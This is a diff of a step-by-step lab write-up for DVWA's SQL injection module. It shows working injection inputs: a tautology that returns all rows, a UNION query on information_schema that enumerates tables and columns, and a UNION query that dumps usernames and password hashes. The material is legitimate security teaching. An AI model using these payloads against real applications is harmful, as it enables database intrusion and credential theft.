@@ -7,42 +7,65 @@ A helpdesk system fetches user profiles using a numeric ID but exposes raw DB re
 There are 5 users in the database, with id's from 1 to 5. Your mission... to steal their passwords via SQLi. Use SQL Injection to enumerate DB tables, dump data, and escalate.
 
 ### 🧪 Steps
-1. Access DVWA → SQL Injection
+1. Navigate to DVWA → **SQL Injection** module.
 
-2. We know from the `Objective` that the database contains five users with numerical IDs. Performing ordinary SQL queries on these user IDs gives us their first names and surnames.
+2. Based on the `objective`, we know the database holds five users, each identified by a numeric ID. Entering a user ID returns their first and last names.
 
-3. Checking the source code from "View Source" button we find that the underlying SQL query statement is:
+3. Click the **View Source** button to inspect the backend SQL query:
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '$id'
 ```
-The SQL query to return $first and $last fields.
+The SQL query to return `$first` and `$last` fields.
 
-4. Let’s manipulate the text form input denoted by `$id` and explore ways to escape it to get the passwords.
+4. To explore beyond this query, manipulate the `$id` parameter by submitting:
 
-5. Extract data on all the five users in the database with the input `%' or '0'='0`, which yields the following unsanitized SQL query where `%` is a wildcard character, `'0'='0'` is a tautology, and the opening and closing straight apostrophes `'`match in the underlying PHP code, so that it becomes:
+```sql
+%' or '0'='0
+```
+This yields the following unsanitized query:
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
 ```
 
-6. If a simple tautology can escape the query, so can any SQL keyword from the user. In particular, the `UNION` keyword in SQL combined with a suitable `SELECT` query will expose the underlying database. We call this approach a `SQL injection UNION attack`.
+- `%` is a wildcard
+- `'0'='0'` always evaluates true
+- The quotes align correctly, ensuring valid execution
 
-7. The [MySQL documentation](https://dev.mysql.com/doc/refman/8.4/en/information-schema.html) reveals that a table called `information_schema` stores information about the database containing the `users` table. This table gives us a clue as to where to find the passwords. We also want to ensure we assign values to the two variables `$first` and `$last` by returning two columns, not one.
+5. Now let’s try a more advanced SQL injection using `UNION` to combine results from another query. In particular, the `UNION` keyword in SQL combined with a suitable `SELECT` query will expose the underlying database. We call this approach a `SQL injection UNION attack`.
 
-8. We assign to `$id` the text input of `%' UNION SELECT table_name,column_name FROM information_schema.columns #`, where `#` marks the beginning of a comment (`';`). Thus, the SQL query becomes:
+6. MySQL stores metadata in the `information_schema.columns` table, which contains names of all tables and their columns.
+
+7. Use the following input to enumerate table and column names:
 
 ```sql
-SELECT first_name, last_name FROM users WHERE user_id = '%' UNION SELECT table_name,column_name FROM information_schema.columns #';
+%' UNION SELECT table_name, column_name FROM information_schema.columns #
 ```
 
-9. Your penultimate strike is to capture the passwords while returning two data columns. Here, we choose the text input of `%' UNION SELECT user, password FROM users #` into our vulnerable page.
+Resulting query:
+
+```sql
+SELECT first_name, last_name FROM users WHERE user_id = '%' 
+UNION SELECT table_name, column_name FROM information_schema.columns #';
+```
+- `#` is a comment character that discards the rest of the original query
+- We also want to ensure we assign values to the two variables `$first` and `$last` by returning two columns, not one.
+
+8. After identifying the correct table (likely `users`) and columns (`user`, `password`), modify your input to extract credentials:
+
+```sql
+%' UNION SELECT user, password FROM users #
+```
+
+Which becomes:
 
 ```sql
 SELECT first_name, last_name FROM users WHERE user_id = '%' UNION SELECT user, password FROM users #';
 ```
+You will now see a list of usernames alongside hashed passwords.
 
-10. We’ve found password hashes instead of plain-text passwords. Cracking passwords is outside the scope of this introductory DVWA guide.
+9. We’ve found password hashes instead of plain-text passwords. Cracking passwords is outside the scope of this lab.
 
 
 ### 🧠 Real-World Context
